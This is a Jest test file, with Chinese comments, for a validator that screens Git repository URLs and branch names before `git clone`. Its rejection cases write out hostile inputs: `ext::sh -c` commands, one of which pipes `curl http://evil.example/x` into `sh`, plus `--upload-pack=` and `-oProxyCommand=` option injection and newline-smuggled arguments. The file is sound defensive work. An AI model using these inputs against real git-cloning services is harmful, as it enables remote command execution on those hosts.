import { isSafeGitReference, isSafeGitRepositoryUrl } from './git-repository-url';

/**
 * 仓库 URL / Git 引用白名单回归测试。
 *
 * 背景：`GitRunner` 把 `repositoryUrl` 作为位置参数传给 `git clone`。即使走
 * `execFile`（不经过 shell），Git 自身仍有两类危险语法：
 *
 * 1. `ext::` 远程助手协议 —— `git clone 'ext::sh -c cmd'` 会直接执行命令，
 *    与 shell 无关，是 Git 的内置能力。
 * 2. 以 `-` 开头的值会被 Git 当成选项而不是 URL（例如 `--upload-pack=`）。
 *
 * 因此"参数化执行"只解决注入，不解决"参数本身就能干坏事"。本文件锁住
 * 白名单必须拒绝的传输方式和必须放行的合法形态；任何放宽 `isSafeGitRepositoryUrl`
 * 的改动都应先让这里失败。
 */
describe('isSafeGitRepositoryUrl', () => {
  describe('拒绝可导致命令执行的传输方式', () => {
    it.each([
      ['ext:: 远程助手', 'ext::sh -c whoami'],
      ['ext:: 带引号命令', 'ext::sh -c "curl http://evil.example/x | sh"'],
      ['大写 EXT:: 同样拒绝', 'EXT::sh -c id'],
      ['ext:: 伪装成仓库路径', 'ext::git-upload-pack %S /repo'],
    ])('%s', (_label, value) => {
      expect(isSafeGitRepositoryUrl(value)).toBe(false);
    });
  });

  describe('拒绝会被 Git 解析成选项的值', () => {
    it.each([
      ['长选项', '--upload-pack=/bin/sh'],
      ['短选项', '-u/bin/sh'],
      ['单个连字符', '-'],
    ])('%s', (_label, value) => {
      expect(isSafeGitRepositoryUrl(value)).toBe(false);
    });
  });

  describe('拒绝本地路径与非网络传输', () => {
    it.each([
      ['file 协议', 'file:///etc/passwd'],
      ['绝对路径', '/etc/passwd'],
      ['相对路径', './local/repo'],
      ['上级路径', '../repo'],
      ['git 协议（无认证无加密）', 'git://github.com/user/repo.git'],
      ['http 明文', 'http://github.com/user/repo.git'],
    ])('%s', (_label, value) => {
      expect(isSafeGitRepositoryUrl(value)).toBe(false);
    });
  });

  describe('拒绝内嵌凭据与可控查询串', () => {
    it.each([
      ['https 内嵌用户名密码', 'https://user:token@github.com/a/b.git'],
      ['https 内嵌用户名', 'https://user@github.com/a/b.git'],
      ['带 query', 'https://github.com/a/b?upload-pack=sh'],
      ['带 fragment', 'https://github.com/a/b#frag'],
      ['ssh 缺少用户名', 'ssh://github.com/a/b.git'],
    ])('%s', (_label, value) => {
      expect(isSafeGitRepositoryUrl(value)).toBe(false);
    });
  });

  describe('拒绝控制字符（否则校验与实际使用的字符串不是同一个）', () => {
    /**
     * `new URL()` 会静默剥掉输入中任意位置的 TAB / CR / LF，并对部分其他控制
     * 字符做百分号编码；Node 进程参数则直接拒绝 NUL。如果不在解析前拦截，
     * 本函数校验的表示和 GitRunner 交给 `git clone` 的原始字符串可能不同。
     * 这类"验一个、用另一个"的不一致必须堵死。
     */
    it.each([
      ['换行', 'https://github.com/a/b\n--upload-pack=sh'],
      ['回车', 'https://github.com/a/b\r--upload-pack=sh'],
      ['制表符', 'https://github.com/a/\tb'],
      ['空字节', 'https://github.com/a/b\0'],
      ['scp 形态里的换行', 'git@github.com:a/b\n-oProxyCommand=sh'],
    ])('%s', (_label, value) => {
      expect(isSafeGitRepositoryUrl(value)).toBe(false);
    });
  });

  describe('拒绝畸形输入', () => {
    it.each([
      ['仅根路径', 'https://github.com/'],
      ['空字符串', ''],
      ['前后空白', '  https://github.com/a/b.git  '],
      ['非字符串', 12345],
      ['null', null],
      ['undefined', undefined],
    ])('%s', (_label, value) => {
      expect(isSafeGitRepositoryUrl(value as unknown)).toBe(false);
    });

    /**
     * `new URL()` 会先规范化路径，`a/../b` 在解析阶段就被解成 `/b`，
     * 所以 `hasUnsafePathSegment` 看到的已经是化简后的结果。这不是漏洞
     * ——化简后仍是一个合法的仓库路径，只是指向了别的仓库。这里显式
     * 断言这个行为，避免以后有人误以为它"漏掉了路径穿越"。
     */
    it('URL 解析阶段已化简 . 与 .. 路径段，化简后合法则放行', () => {
      expect(new URL('https://github.com/a/../../../etc').pathname).toBe('/etc');
      expect(isSafeGitRepositoryUrl('https://github.com/a/../../../etc')).toBe(true);
      expect(isSafeGitRepositoryUrl('https://github.com/a/./b')).toBe(true);
    });

    it('scp 形态不经过 URL 解析，路径段按字面校验', () => {
      expect(isSafeGitRepositoryUrl('git@github.com:a/../../etc')).toBe(false);
    });

    it('拒绝超长 URL', () => {
      expect(isSafeGitRepositoryUrl(`https://github.com/a/${'b'.repeat(1024)}`)).toBe(false);
    });

    it('拒绝 scp 形态里以连字符开头的路径（会被 ssh 当成选项）', () => {
      expect(isSafeGitRepositoryUrl('git@github.com:-oProxyCommand=sh')).toBe(false);
    });
  });

  describe('放行真实使用的合法形态', () => {
    it.each([
      ['GitHub HTTPS 带 .git', 'https://github.com/user/repo.git'],
      ['GitHub HTTPS 不带 .git', 'https://github.com/user/repo'],
      ['scp 风格 Deploy Key', 'git@github.com:user/repo.git'],
      ['ssh 协议带端口', 'ssh://git@gitlab.example.com:2222/group/repo.git'],
      ['自建 GitLab 多级路径', 'https://gitlab.self-hosted.cn/group/subgroup/app.git'],
      ['路径含连字符和下划线', 'https://github.com/my-org/my_repo.git'],
    ])('%s', (_label, value) => {
      expect(isSafeGitRepositoryUrl(value)).toBe(true);
    });
  });
});

describe('isSafeGitReference', () => {
  it.each([
    ['选项形态', '--upload-pack=sh'],
    ['连字符开头', '-main'],
    ['斜杠开头', '/main'],
    ['斜杠结尾', 'main/'],
    ['句点结尾', 'main.'],
    ['双点（Git 保留）', 'a..b'],
    ['双斜杠', 'a//b'],
    ['reflog 语法', 'main@{1}'],
    ['lock 后缀', 'main.lock'],
    ['空格', 'ma in'],
    ['换行', 'main\nx'],
    ['空字符串', ''],
  ])('拒绝 %s', (_label, value) => {
    expect(isSafeGitReference(value)).toBe(false);
  });

  it.each([
    ['普通分支', 'main'],
    ['带层级', 'release/1.0'],
    ['带连字符', 'feat-login'],
    ['带下划线和点', 'v1.2_rc'],
  ])('放行 %s', (_label, value) => {
    expect(isSafeGitReference(value)).toBe(true);
  });
});
